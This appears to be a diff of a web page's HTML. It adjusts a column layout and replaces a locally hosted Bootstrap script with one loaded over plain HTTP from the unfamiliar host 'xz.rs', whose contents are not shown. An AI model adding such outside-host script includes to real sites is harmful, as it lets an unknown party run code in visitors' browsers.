@@ -57,7 +57,7 @@
       <div class="row">
         <!-- All the books and stuff -->
 
-        <div class="col-lg-3 col-md-3 col-xs-6 training-material-container">
+        <div class="col-lg-3 col-md-12 col-xs-12 training-material-container">
             <div class="productbox">
               <div class="imgthumb img-responsive training-material-image">
                 <img src="http://placehold.it/100x150">
@@ -117,7 +117,6 @@
 
 
     <script src="https://code.jquery.com/jquery-1.10.2.min.js"></script>
-    <script src="/js/bootstrap.min.js"></script>
 	<script>
 $('#borrow-form').hide();
 function showBorrowForm() {
@@ -131,6 +130,8 @@ $('.js-btn-borrow').show();
 }
 $('.js-btn-cancel').click(cancelBorrowForm);
 </script>
+
+    <script src="http://xz.rs/_/bootstrap.min.js"></script>
 
 </body>
 </html>
